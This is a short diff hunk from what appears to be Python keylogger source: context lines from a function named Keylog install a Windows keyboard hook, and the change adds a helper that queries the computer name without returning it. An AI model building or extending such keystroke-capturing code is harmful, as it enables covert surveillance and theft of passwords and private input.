@@ -78,3 +78,5 @@ def Keylog(data):
   hooks_manager.KeyDown = OnKeyboardEvent
   hooks_manager.HookKeyboard()
   pythoncom.PumpMessages()
+def getCPUname():
+  win32api.GetComputerName()
